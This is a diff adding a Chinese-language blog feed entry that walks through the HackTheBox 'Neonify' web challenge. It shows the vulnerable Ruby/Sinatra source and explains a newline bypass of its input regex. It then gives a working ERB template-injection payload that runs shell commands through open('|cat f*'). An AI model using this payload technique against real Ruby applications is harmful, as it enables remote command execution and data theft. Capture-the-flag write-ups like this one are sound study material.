@@ -33,6 +33,35 @@
     
     
     <entry>
+      <title>HTB-Neonify-web-challenge-wp</title>
+      <link href="/2022/03/26/HTB-Neonify-web-challenge-wp/"/>
+      <url>/2022/03/26/HTB-Neonify-web-challenge-wp/</url>
+      
+        <content type="html"><![CDATA[<p>第一次遇到ruby后端,感觉ruby语法也有点意思<a id="more"></a><br><img src="image-20220401113528771.png" alt="image-20220401113528771"></p><h2 id="漏洞查询"><a href="#漏洞查询" class="headerlink" title="漏洞查询"></a>漏洞查询</h2><p>分析题目源码：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NeonControllers</span> &lt; Sinatra::Base</span></span><br><span class="line"></span><br><span class="line">  configure <span class="keyword">do</span></span><br><span class="line">    set <span class="symbol">:views</span>, <span class="string">"app/views"</span></span><br><span class="line">    set <span class="symbol">:public_dir</span>, <span class="string">"public"</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  get <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">    @neon = <span class="string">"Glow With The Flow"</span></span><br><span class="line">    erb <span class="symbol">:<span class="string">'index'</span></span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  post <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> params[<span class="symbol">:neon</span>] =~ <span class="regexp">/^[0-9a-z ]+$/i</span></span><br><span class="line">      @neon = ERB.new(params[<span class="symbol">:neon</span>]).result(binding)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      @neon = <span class="string">"Malicious Input Detected"</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    erb <span class="symbol">:<span class="string">'index'</span></span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>发现题目是ruby语言写的后端。进行代码审计发现<code>if params[:neon] =~ /^[0-9a-z ]+$/i</code> 发现存在换行绕过。</p><p><img src="image-20220326111436835.png" alt="image-20220326111436835"></p><p>于是<code>neon=1111%0axxxxj!&lt;&gt;</code>绕过正则限制.</p><p><img src="image-20220326111830872.png" alt="image-20220326111830872"></p><p>然后，一下找不到什么利用点了，但是百度下ERB发现是Embedded RuBy的简称，意思是嵌入式的Ruby，是一种文本模板技术.语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;% %&gt;</span><br><span class="line">在括号内执行ruby代码。</span><br><span class="line"></span><br><span class="line">&lt;%&#x3D; %&gt;</span><br><span class="line">在ERB文件中打印一些东西。</span><br><span class="line"></span><br><span class="line">&lt;% -%&gt;</span><br><span class="line">避免在表达式后中断行。</span><br><span class="line"></span><br><span class="line">&lt;%# %&gt;</span><br><span class="line">括号内的注释；未发送到客户端(与HTML注释相反)。</span><br></pre></td></tr></table></figure><p>其中提到一个例子：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlTemplate = ERB.new <span class="string">%q&#123;  </span></span><br><span class="line"><span class="string">&lt;%for organization in domains.keys%&gt;  </span></span><br><span class="line"><span class="string">    insert into org_domain(Domain, organization) values('&lt;%=domains[organization]%&gt;','&lt;%=organization%&gt;');  </span></span><br><span class="line"><span class="string">&lt;%end%&gt;  </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>因此猜测在<code>ERB.new(params[:neon]).result(binding)</code>处用ssti.</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们可以通过<code>&lt;% %&gt;</code>来执行代码，但是我们看不到回显。下面例子可以看到程序因为找不到xxx而报错。说明我们的代码被执行了。</p><p><img src="image-20220326112945963.png" alt="image-20220326112945963"></p><p>但是传统的system,exec都无法直接回显。都要通过vps反弹shell。</p><p>通过收集资料发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file &#x3D; &#39;|whoami&#39;</span><br><span class="line">puts open(file).read()  # ubuntu</span><br><span class="line">puts open(file).gets    # ubuntu</span><br></pre></td></tr></table></figure><p>open可以回显出命令执行结果。</p><p>因此我们构造payload即可得到flag</p><p><code>neon=1111%0axxxxj!&lt;/h1&gt;&lt;%25=open(&#39;|cat f*&#39;).read()%25&gt;&lt;h1&gt;</code></p><p><img src="image-20220326120227996.png" alt="image-20220326120227996"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.cnblogs.com/cuimiemie/p/6442695.html" target="_blank" rel="noopener">https://www.cnblogs.com/cuimiemie/p/6442695.html</a></p><p><a href="https://droidyue.com/blog/2014/11/18/six-ways-to-run-shell-in-ruby/" target="_blank" rel="noopener">https://droidyue.com/blog/2014/11/18/six-ways-to-run-shell-in-ruby/</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+          <category> HTB </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web </tag>
+            
+            <tag> ruby </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>HTB-Pandora-Machine-wp</title>
       <link href="/2022/03/08/HTB-Pandora-wp/"/>
       <url>/2022/03/08/HTB-Pandora-wp/</url>
